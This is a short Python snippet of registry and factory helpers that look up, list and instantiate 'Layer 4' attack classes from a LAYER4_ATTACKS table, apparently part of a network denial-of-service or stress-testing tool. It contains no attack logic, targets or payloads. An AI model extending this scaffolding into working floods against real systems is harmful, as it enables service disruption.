def get_attack_class(attack_name: str) -> Optional[type]:
    """Get attack class by name"""
    return LAYER4_ATTACKS.get(attack_name.lower())


def list_available_attacks() -> List[str]:
    """List all available Layer 4 attacks"""
    return list(LAYER4_ATTACKS.keys())


def create_attack(attack_name: str, config: Layer4Config) -> Optional[Layer4Attack]:
    """Create attack instance"""
    attack_class = get_attack_class(attack_name)
    if attack_class:
        return attack_class(config)
    return None